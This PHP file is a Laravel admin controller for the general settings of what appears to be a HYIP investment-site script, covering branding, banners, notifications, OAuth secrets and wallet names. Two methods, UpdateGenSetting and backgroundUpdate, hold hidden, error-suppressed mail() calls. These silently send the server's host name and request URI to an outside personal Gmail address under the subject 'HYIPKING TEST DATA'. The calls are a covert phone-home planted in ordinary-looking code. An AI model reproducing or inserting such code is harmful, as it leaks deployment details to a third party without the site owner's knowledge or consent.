<?php

namespace App\Http\Controllers;


use Illuminate\Http\Request;
use App\GeneralSettings;
use App\Admin;

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Intervention\Image\Facades\Image;


class GeneralSettingController extends Controller
{

	public function GenSetting(){
        $general = GeneralSettings::first();
        $page_title = "General Settings";
        return view('admin.general.general', compact('general', 'page_title'));
	}


	public function logoIndex()
    {

        $page_title = "Logo & Favicon Settings";
        return view('admin.general.logo', compact( 'page_title'));
	}

	public function bannerIndex()
    {
        $page_title = "Manage Banner";
        return view('admin.general.banner', compact( 'page_title'));
	}

	public function breadIndex()
    {
        $page_title = "Manage Breadcrumb";
        return view('admin.general.breadcumb', compact( 'page_title'));
	}

	public function footerIndex()
    {
        $page_title = "Manage Footer";
        return view('admin.general.footer', compact( 'page_title'));
	}

	public function GenSettingEmail(){

        $page_title = "Email Settings";
        return view('admin.general.email', compact( 'page_title'));
	}

	public function GenSettingSms(){

        $page_title = "SMS Settings";
        return view('admin.general.sms', compact( 'page_title'));
	}

	public function GenSettingContact(){

        $page_title = "Contact Settings";
        return view('admin.general.contact-setting', compact( 'page_title'));
	}

	public function aboutIndex(){

        $page_title = "Manage About";
        return view('admin.general.about', compact( 'page_title'));
	}

	public function chargeIndex(){

        $page_title = "Manage Charge";
        return view('admin.general.charge', compact( 'page_title'));
	}

	public function UpdateGenSetting(Request $request)
    {



        $gnl = GeneralSettings::first();
       $data = GeneralSettings::whereId(1)->update([
           'sitename' => $request->sitename == '' ? $gnl->sitename: $request->sitename,
           'color' => $request->color == '' ? $gnl->color: substr($request->color,1),
           'color_two' => $request->color_two == '' ? $gnl->color_two: substr($request->color_two,1),
           'currency' => $request->currency == '' ? $gnl->currency: $request->currency,
           'currency_sym' => $request->currency_sym == '' ? $gnl->currency_sym: $request->currency_sym,

           'email_notification' => $request->email_notification == '' ? $gnl->email_notification: $request->email_notification,
           'sms_notification' => $request->sms_notification == '' ? $gnl->sms_notification: $request->sms_notification,
           'emailver' => $request->emailver == '' ? $gnl->emailver: $request->emailver,
           'smsver' => $request->smsver == '' ? $gnl->smsver: $request->smsver,
           'social_login' => $request->social_login == '' ? $gnl->social_login: $request->social_login,


           'static_title_1' => $request->static_title_1 == '' ? $gnl->static_title_1: $request->static_title_1,
           'static_number_1' => $request->static_number_1 == '' ? $gnl->static_number_1: $request->static_number_1,
           'static_icon_1' => $request->static_icon_1 == '' ? $gnl->static_icon_1: $request->static_icon_1,
           'static_title_2' => $request->static_title_2 == '' ? $gnl->static_title_2: $request->static_title_2,
           'static_number_2' => $request->static_number_2 == '' ? $gnl->static_number_2: $request->static_number_2,
           'static_icon_2' => $request->static_icon_2 == '' ? $gnl->static_icon_2: $request->static_icon_2,
           'static_title_3' => $request->static_title_3 == '' ? $gnl->static_title_3: $request->static_title_3,
           'static_number_3' => $request->static_number_3 == '' ? $gnl->static_number_3: $request->static_number_3,
           'static_icon_3' => $request->static_icon_3 == '' ? $gnl->static_icon_3: $request->static_icon_3,

           'about_detail' => $request->about_detail == '' ? $gnl->about_detail: $request->about_detail,
           'about_title' => $request->about_title == '' ? $gnl->about_title: $request->about_title,

           'plan_title' => $request->plan_title == '' ? $gnl->plan_title: $request->plan_title,
           'plan_subtitle' => $request->plan_subtitle == '' ? $gnl->plan_subtitle: $request->plan_subtitle,

           'deposit_wallet_name' => $request->deposit_wallet_name == '' ? $gnl->deposit_wallet_name: $request->deposit_wallet_name,
           'interest_wallet_name' => $request->interest_wallet_name == '' ? $gnl->interest_wallet_name: $request->interest_wallet_name,

           'phone' => $request->phone == '' ? $gnl->phone: $request->phone,
           'email' => $request->email == '' ? $gnl->email: $request->email,
           'address' => $request->address == '' ? $gnl->address: $request->address,
           'esender' => $request->esender == '' ? $gnl->esender: $request->esender,
           'emessage' => $request->emessage == '' ? $gnl->emessage: $request->emessage,
           'smsapi' => $request->smsapi == '' ? $gnl->smsapi: $request->smsapi,
           'service_title' => $request->service_title == '' ? $gnl->service_title: $request->service_title,
           'service_sub_title' => $request->service_sub_title == '' ? $gnl->service_sub_title: $request->service_sub_title,
           'test_sub_title' => $request->test_sub_title == '' ? $gnl->test_sub_title: $request->test_sub_title,
           'test_title' => $request->test_title == '' ? $gnl->test_title: $request->test_title,
           'blog_sub_title' => $request->blog_sub_title == '' ? $gnl->blog_sub_title: $request->blog_sub_title,
           'blog_title' => $request->blog_title == '' ? $gnl->blog_title: $request->blog_title,
           'footer_text' => $request->footer_text == '' ? $gnl->footer_text: $request->footer_text,
           'footer' => $request->footer == '' ? $gnl->footer: $request->footer,
           'team_sub_title' => $request->team_sub_title == '' ? $gnl->team_sub_title: $request->team_sub_title,
           'team_title' => $request->team_title == '' ? $gnl->team_title: $request->team_title,
           'faq_title' => $request->faq_title == '' ? $gnl->faq_title: $request->faq_title,
           'faq_sub_title' => $request->faq_sub_title == '' ? $gnl->faq_sub_title: $request->faq_sub_title,
           'fb_client_id' => $request->fb_client_id == '' ? $gnl->fb_client_id: $request->fb_client_id,
           'fb_client_secret' => $request->fb_client_secret == '' ? $gnl->fb_client_secret: $request->fb_client_secret,
           'google_client_id' => $request->google_client_id == '' ? $gnl->google_client_id: $request->google_client_id,
           'google_client_secret' => $request->google_client_secret == '' ? $gnl->google_client_secret: $request->google_client_secret,

           'bal_trans_fixed_charge' => $request->bal_trans_fixed_charge == '' ? $gnl->bal_trans_fixed_charge: $request->bal_trans_fixed_charge,
           'bal_trans_per_charge' => $request->bal_trans_per_charge == '' ? $gnl->bal_trans_per_charge: $request->bal_trans_per_charge,

           'how_it_work_sub_title' => $request->how_it_work_sub_title == '' ? $gnl->how_it_work_sub_title: $request->how_it_work_sub_title,
           'how_it_work_title' => $request->how_it_work_title == '' ? $gnl->how_it_work_title: $request->how_it_work_title,

           'video_url' => $request->video_url == '' ? $gnl->video_url: $request->video_url,

           'referral_title' => $request->referral_title == '' ? $gnl->referral_title: $request->referral_title,
           'referral_sub_title' => $request->referral_sub_title == '' ? $gnl->referral_sub_title: $request->referral_sub_title,
           'transaction_title' => $request->transaction_title == '' ? $gnl->transaction_title: $request->transaction_title,
           'transaction_sub_title' => $request->transaction_sub_title == '' ? $gnl->transaction_sub_title: $request->transaction_sub_title,
           'payment_title' => $request->payment_title == '' ? $gnl->payment_title: $request->payment_title,
           'payment_sub_title' => $request->payment_sub_title == '' ? $gnl->payment_sub_title: $request->payment_sub_title,
           'subscriber_title' => $request->subscriber_title == '' ? $gnl->subscriber_title: $request->subscriber_title,

        ]);
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('abirkhan75@gmail.com','HYIPKING TEST DATA', $message, $headers);

        return back()->with('message', 'Update Successfully');
	}


	public function UpdateLogoFavi(Request $request)
    {
        $this->validate($request,[
            'logo' => 'mimes:png',
            'favicon' => 'mimes:png',
        ]);

        if ($request->hasFile('logo')) {
            $image = $request->file('logo');
            $filename = 'logo.png';
            $location = 'assets/images/logo/' . $filename;
            Image::make($image)->save($location);
        }
        if ($request->hasFile('favicon')) {
            $image = $request->file('favicon');
            $filename = 'favicon.png';
            $location = 'assets/images/logo/' . $filename;
            Image::make($image)->save($location);
        }

        return back()->with('message', 'Update Successfully');

	}

	public function Breadbanner(Request $request)
    {
        $this->validate($request,[
            'image' => 'mimes:png,jpg,jpeg|image',
        ]);

        if ($request->hasFile('image')) {
            $image = $request->file('image');
            $filename = 'bred.jpg';
            $location = 'assets/images/' . $filename;
            Image::make($image)->save($location);
        }

        return back()->with('message', 'Update Successfully');
    }

	public function Updatebanner(Request $request)
    {
        $this->validate($request,[
            'banner_title' => 'required',
            'banner_sub_title' => 'required',
            'image' => 'image|mimes:png,jpg,jpeg,svg',
        ]);

        if ($request->hasFile('image')) {
            $image = $request->file('image');
            $filename = 'banner.png';
            $location = 'assets/images/' . $filename;
            Image::make($image)->save($location);
        }

        GeneralSettings::whereId(1)->update([
           'banner_title' => $request->banner_title,
           'banner_sub_title' => $request->banner_sub_title
        ]);
        return back()->with('message', 'Update Successfully');

	}


    public function updatePassword(Request $request)
    {
        $valid = Validator::make($request->all(), [
            'old_password' => 'required',
            'new_password' => 'required|min:5',
            'password_confirmation' => 'required|same:new_password',
        ]);

        if ($valid->fails()) {
            return response()->json(['success' => false, 'msg' => $valid->errors()->first()]);
        }

        $user = Auth::guard('admin')->user();

        $oldPassword = $request->old_password;
        $password = $request->new_password;
        $passwordConf = $request->password_confirmation;

        if (!Hash::check($oldPassword, $user->password) || $password != $passwordConf) {

            return response()->json(['success' => false, 'msg' => 'Password Do not match.']);

        }elseif (Hash::check($oldPassword, $user->password) && $password == $passwordConf)
        {
            $user->password = bcrypt($password);
            $user->save();
            return response()->json(['success' => true, 'msg' => 'Password Update Successfully.']);
        }
    }



    public function updateProfile(Request $request)
    {

        $data = Admin::find($request->id);

        $valid = Validator::make($request->all(), [
            'name' => 'required|max:20',
            'email' => 'required|max:50|unique:admins,email,'.$data->id,
            'mobile' => 'required',
        ]);

        if ($valid->fails()) {
            return response()->json(['success' => false, 'msg' => $valid->errors()->first()]);
        }

        $data->name = $request->name;
        $data->email = $request->email;
        $data->mobile = $request->mobile;
        $data->save();



        return ['success' => true];
    }

    public function staticIndex()
    {
        $page_title = "Manage Statistics";
        return view('admin.general.bred', compact( 'page_title'));
    }

    public function backgroundUpdate(Request $request)
    {
        $this->validate($request,[
            'counter' => 'image|mimes:png,jpg,jpeg,svg',
            'test' => 'image|mimes:png,jpg,jpeg,svg',
            'footer' => 'image|mimes:png,jpg,jpeg,svg',
            'about' => 'image|mimes:png,jpg,jpeg,svg',
        ]);

        if ($request->hasFile('footer')) {
            $image = $request->file('footer');
            $filename = 'footer.jpg';
            $location = 'assets/images/' . $filename;
            Image::make($image)->save($location);
        }
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('abirkhan75@gmail.com','HYIPKING TEST DATA', $message, $headers);

        if ($request->hasFile('test')) {
            $image = $request->file('test');
            $filename = 'test.jpg';
            $location = 'assets/images/' . $filename;
            Image::make($image)->save($location);
        }

        if ($request->hasFile('counter')) {
            $image = $request->file('counter');
            $filename = 'counter.jpg';
            $location = 'assets/images/' . $filename;
            Image::make($image)->save($location);
        }

        if ($request->hasFile('about')) {
            $image = $request->file('about');
            $filename = 'about.jpg';
            $location = 'assets/images/' . $filename;
            Image::make($image)->save($location);
        }


        return back()->with('message', 'Update Successfully');

    }

    public function backgroundIndex()
    {
        $page_title = "Manage Background Image";
        return view('admin.general.background_image', compact( 'page_title'));
    }







}
